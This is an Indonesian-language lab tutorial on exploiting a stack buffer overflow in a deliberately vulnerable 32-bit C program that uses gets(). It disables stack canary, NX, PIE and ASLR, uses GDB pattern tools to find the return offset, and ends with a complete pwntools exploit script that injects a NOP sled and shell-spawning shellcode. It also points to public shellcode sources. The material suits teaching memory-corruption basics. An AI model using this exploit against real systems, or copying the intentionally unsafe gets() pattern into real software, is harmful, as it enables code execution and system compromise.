Syarat dari langkah ini adalah stack executable (NO NX)

[x] NO Canary ~ -fno-stack-protector
[x] NO PIE ~ -no-pie
[x] NO NX ~ -z execstack
[x] NO ASLR ~ echo 0 > /proc/sys/kernel/randomize_va_space

vuln_program.c

```c
#include<stdio.h>

void foo()
{
    char buffer[40];
    puts("give me your input :)\n");
    gets(buffer);
}

void main()
{
    foo();
}
```

kita kompile dengan cara seperti ini untuk supaya tidak ada perlindungan Canary,NX,PIE

```bash
gcc -g -m32 -fno-stack-protector -z execstack -no-pie -o vuln32 vuln_program.c
```

setting disable untuk perlindungan ASLR pada sistem operasi linux

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

jalankan program vuln32 dengan gdb kemudian lakukan checksec

```bash
$gdb -q vuln32
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

solusinya seperti gambar dibawah ini

![[stack-frame-untuk menyimpan shellcode.png]]

untuk mendapatkan shell code bisa diambil dari 

http://shell-storm.org/shellcode/files/shellcode-841.html

atau menggunakan msfvenom

mencari padding dengan cara seperti berikut

```bash
$gdb -q vuln32
Reading symbols from vuln32...done.
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run
Starting program: /root/You_Tube/Stack_Buffer_Overflow/3/vuln32 
give me your input :)
  

AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd618 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x41414641 ('AFAA')
ECX: 0xf7fb55c0 --> 0xfbad2288 
EDX: 0xf7fb689c --> 0x0 
ESI: 0xf7fb5000 --> 0x1d9d6c 
EDI: 0xf7fb5000 --> 0x1d9d6c 
EBP: 0x31414162 ('bAA1')
ESP: 0xffffd650 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41474141 ('AAGA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41474141
[------------------------------------stack-------------------------------------]
0000| 0xffffd650 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd654 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd658 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffd65c ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffd660 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffd664 ("AA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd668 ("AJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd66c ("fAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41474141 in ?? ()
gdb-peda$ pattern offset 0x41474141
1095188801 found at offset: 52
```

berikut ini exploit

```bash
# padding --> 52
from pwn import *

p = process('./vuln32')
print(p.recv())
padding = b'0x90'*52
ret = p32(0xffffd6f0)  
nop = b'\x90'*240

shellcode = b'\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81'

p.sendline(padding+ret+nop+shellcode)
print(p.clean())
p.interactive()
```

